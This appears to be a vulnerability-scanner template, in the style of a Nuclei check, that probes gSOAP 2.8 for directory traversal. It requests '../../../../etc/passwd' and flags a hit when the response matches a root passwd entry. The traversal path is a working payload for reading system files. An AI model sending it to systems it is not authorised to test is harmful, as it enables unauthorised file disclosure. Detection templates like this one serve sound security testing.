id: gsoap-lfi
info:
  author: 0x_Akoko
  name: gSOAP 2.8 - Directory Traversal
  reference: https://www.exploit-db.com/exploits/47653
  severity: high
  tags: gsoap,lfi
requests:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/../../../../../../../../../etc/passwd'
